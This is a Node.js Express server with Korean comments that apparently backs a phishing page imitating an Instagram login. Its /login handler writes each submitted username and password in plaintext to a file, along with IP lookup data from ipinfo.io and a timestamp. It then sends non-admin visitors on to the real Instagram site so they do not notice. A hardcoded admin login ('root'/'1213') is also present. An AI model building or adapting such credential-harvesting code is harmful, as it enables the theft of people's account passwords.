const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// 로그인 페이지 제공
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');

});

app.post('/pushoong', (req, res) => {
    res.sendFile(__dirname + '/public/login.html');

});

// 로그인 요청 처리
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // 입력한 ID를 파일에 저장

    // ex) 2024-02-26
    var today = new Date();
    var year = today.getFullYear();
    var month = ('0' + (today.getMonth() + 1)).slice(-2);
    var day = ('0' + today.getDate()).slice(-2);
    var dateString = year + '-' + month + '-' + day;
    // ex) 05:06:53
    var hours = ('0' + today.getHours()).slice(-2); 
    var minutes = ('0' + today.getMinutes()).slice(-2);
    var seconds = ('0' + today.getSeconds()).slice(-2); 
    var timeString = hours + ':' + minutes  + ':' + seconds;
    // ip address
    async function getIPAddress() {
        try {
            const response = await axios.get('https://ipinfo.io/json');
            const ip = response.data;
            return ip;
        } catch (error) {
            console.error('Error fetching IP address', error);
            throw error;
        }
    }
    // IP 주소를 가져와서 user_ids.txt 파일에 추가하는 함수
    async function saveIPAddressToFile() {
        try {
            const ip = await getIPAddress()
            const ipo = JSON.stringify(ip)
            const ipa = JSON.parse(ipo)
            // 객체의 프로퍼티를 순회하며 포맷팅
            let formattedStr ='{\n';
            for (const key in ipa) {
                if (Object.hasOwnProperty.call(ipa, key)) {
                    formattedStr += `"${key}":"${ipa[key]}",\n`;
                }
            }
            // 마지막 쉼표(,)와 줄바꿈(\n) 제거
            formattedStr = formattedStr.slice(0, -2);
            formattedStr += '\n}';

            fs.appendFile('user_ids.txt', formattedStr + '\n' + '-------------------------- ' + dateString + ' ' + timeString + '\n', (err) => {
                if (err) {
                    console.error('Error saving IP address:', err);
                } else {
                    console.log('IP address saved successfully');
                }
            });
        } catch (error) {
            console.error('Error saving IP address to file:', error);
        }
    }

    // 사용자의 IP 주소를 가져와서 파일에 저장
    saveIPAddressToFile();


    fs.appendFile('user_ids.txt', 'id : ' + username + '\n' + 'pw : ' + password + '\n\n', (err) => {
        if (err) {
            console.error('Error saving username:', err);
        } else {
            console.log('username & password saved successfully')
        }
    });

    // 어드민 계정 비교
    if (username === 'root' && password === '1213') {
        res.redirect('/admin');
    } else {
        res.redirect('/default');
    }
});

// 어드민 페이지 제공
app.get('/admin', (req, res) => {
    res.send('<h1>Welcome to Admin Page</h1>');
});

// 기본 페이지 제공
app.get('/default', (req, res) => {
    res.redirect('https://www.instagram.com/')
    // res.send('<h1>Welcome to Default Page</h1>');
});

// 서버 시작
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

